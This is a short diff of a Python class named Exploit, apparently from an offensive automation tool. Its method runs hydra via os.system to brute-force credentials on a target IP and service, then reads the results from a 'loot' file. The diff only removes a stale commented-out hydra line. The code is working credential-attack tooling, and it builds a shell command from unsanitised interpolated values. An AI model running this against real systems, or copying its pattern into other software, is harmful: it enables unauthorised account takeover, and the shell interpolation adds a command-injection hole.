@@ -10,7 +10,6 @@ class Exploit:
         """Run brute force attack against known IP address to find valid credentials"""
         file_name = f'data/loot_{ip_address}_{self.name}.txt'
         os.system(f"hydra -L {usernames} -P {passwords} -o {file_name} {self.name}://{ip_address}")
-        # os.system("hydra -L {usernames} -P {passwords} {ip_address} {self.name} -o  ")
         return_list = []
         try:
             loot_file = open(file_name, 'r')
